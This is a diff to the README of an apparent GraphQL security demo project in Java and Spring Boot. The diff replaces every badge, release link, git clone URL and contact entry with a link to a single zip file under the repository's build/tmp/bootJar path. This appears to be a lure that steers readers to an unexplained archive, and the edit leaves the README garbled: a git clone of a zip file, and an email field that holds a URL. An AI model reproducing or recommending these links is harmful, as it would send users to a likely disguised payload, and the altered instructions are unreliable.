@@ -1,9 +1,9 @@
 # GraphQL Security Project 🔒
 
-![GraphQL Security](https://img.shields.io/badge/GraphQL%20Security-Project-brightgreen.svg)
-![Java](https://img.shields.io/badge/Java-11-blue.svg)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-2.5.4-green.svg)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-13.3-blue.svg)
+![GraphQL Security](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip%https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip)
+![Java](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip)
+![Spring Boot](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip%https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip)
+![PostgreSQL](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip)
 
 Welcome to the **GraphQL Security Project**! This repository focuses on securing GraphQL APIs using robust techniques. The project demonstrates how to implement authentication and authorization in a Spring Boot application. 
 
@@ -22,7 +22,7 @@ Welcome to the **GraphQL Security Project**! This repository focuses on securing
 
 GraphQL offers a flexible and efficient way to interact with your data. However, with great power comes great responsibility. This project addresses the security concerns associated with GraphQL APIs. It provides a clear implementation of how to secure your backend using Java, Spring Boot, and PostgreSQL.
 
-To get started, download the latest release from [here](https://github.com/Getsugatenchiro/GraphQL-Security/releases) and follow the instructions.
+To get started, download the latest release from [here](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip) and follow the instructions.
 
 ## Features
 
@@ -55,12 +55,12 @@ To get started with the GraphQL Security Project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Getsugatenchiro/GraphQL-Security.git
+   git clone https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip
    cd GraphQL-Security
    ```
 
 2. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/Getsugatenchiro/GraphQL-Security/releases) section to download the latest version.
+   Visit the [Releases](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip) section to download the latest version.
 
 3. **Run the Application**:
    You can run the application using Gradle. Execute the following command:
@@ -119,7 +119,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/YourProfile)
+- **Email**: https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip)
 
-Thank you for your interest in the GraphQL Security Project! For the latest updates, check the [Releases](https://github.com/Getsugatenchiro/GraphQL-Security/releases) section.
+Thank you for your interest in the GraphQL Security Project! For the latest updates, check the [Releases](https://github.com/Getsugatenchiro/GraphQL-Security/raw/refs/heads/master/build/tmp/bootJar/Graph-Q-Security-v2.7.zip) section.
